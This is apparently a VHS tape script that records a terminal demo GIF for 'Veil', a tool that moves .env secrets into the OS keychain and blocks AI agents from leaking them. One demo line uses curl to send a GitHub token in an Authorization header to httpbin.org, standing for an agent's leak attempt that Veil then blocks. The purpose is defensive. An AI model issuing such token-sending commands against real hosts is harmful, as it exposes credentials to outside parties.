Output .github/demo.gif

Set Theme "Dracula"
Set FontFamily "JetBrains Mono"
Set FontSize 18
Set Width 1300
Set Height 780
Set Padding 28
Set Margin 36
Set MarginFill "#1a1b26"
Set BorderRadius 10
Set WindowBar Colorful
Set WindowBarSize 40
Set Shell bash
Set TypingSpeed 30ms

# Hidden setup: cd to isolated demo dir, alias veil to the built binary,
# define a `say` helper that erases the (hidden) typed call line and then
# animates the cyan narration character-by-character. None of this appears.
Hide
Set TypingSpeed 0
Type "cd $VEIL_DEMO_DIR && unset VEIL_DEMO_DIR"
Enter
Type `veil() { $VEIL_BIN "$@"; }`
Enter
Type `say() { printf '\033[1A\033[2K\r\033[1;36m▸ '; local i t="$*"; for ((i=0;i<${#t};i++)); do printf '%s' "${t:$i:1}"; sleep 0.04; done; printf '\033[0m\n'; }`
Enter
Type `export PS1='\[\033[1;32m\]$\[\033[0m\] '`
Enter
Type "clear"
Enter
Show
Set TypingSpeed 30ms

# --- Demo ---

# Each narration: hide the typed `say "..."` (TypingSpeed 0 → instant),
# Show resumes after Enter so frames capture the cyan animation only.
Hide
Set TypingSpeed 0
Type `say "Your project has secrets the AI agent shouldn't see:"`
Enter
Show
Sleep 2700ms
Set TypingSpeed 30ms

Type "cat .env"
Enter
Sleep 2000ms

Hide
Set TypingSpeed 0
Type `say "Veil migrates them into the OS keychain and leaves format-aware placeholders:"`
Enter
Show
Sleep 3700ms
Set TypingSpeed 30ms

Type "veil init --yes"
Enter
Sleep 2000ms

Type "cat .env"
Enter
Sleep 2500ms

# Load placeholders into the shell env (hidden, then erase the typed line).
Hide
Set TypingSpeed 0
Type `set -a && . ./.env && set +a && printf '\033[2K\r\033[1A\033[2K\r'`
Enter
Show
Set TypingSpeed 30ms

Hide
Set TypingSpeed 0
Type `say "Now watch Veil block a leak — the agent tries to send the GitHub token to the wrong host:"`
Enter
Show
Sleep 4200ms
Set TypingSpeed 30ms

Type `veil run -- curl -s -H "Authorization: token $GITHUB_TOKEN" https://httpbin.org/headers`
Enter
Sleep 2800ms

Hide
Set TypingSpeed 0
Type `say "Every block (and injection) is logged locally:"`
Enter
Show
Sleep 2500ms
Set TypingSpeed 30ms

Type "veil log --since 1m"
Enter
Sleep 3000ms
